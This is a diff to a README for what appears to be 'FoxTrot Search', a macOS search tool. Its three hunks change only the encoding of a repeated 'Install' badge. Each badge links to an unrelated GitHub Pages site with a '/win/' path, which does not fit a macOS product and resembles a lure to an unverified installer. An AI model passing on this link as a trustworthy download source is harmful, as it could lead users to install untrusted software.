@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install FoxTrot Search](https://img.shields.io/badge/⬇_Install_FoxTrot%20Search-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FoxTrot Search](https://img.shields.io/badge/⬇_Install_FoxTrot+Search-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ FoxTrot Search is a professional macOS desktop search tool providing advanced fu
 
 <div align="center">
 
-[![⬇ Install FoxTrot Search](https://img.shields.io/badge/⬇_Install_FoxTrot%20Search-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FoxTrot Search](https://img.shields.io/badge/⬇_Install_FoxTrot+Search-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ FoxTrot Search is a professional macOS desktop search tool providing advanced fu
 
 <div align="center">
 
-[![⬇ Install FoxTrot Search](https://img.shields.io/badge/⬇_Install_FoxTrot%20Search-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FoxTrot Search](https://img.shields.io/badge/⬇_Install_FoxTrot+Search-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
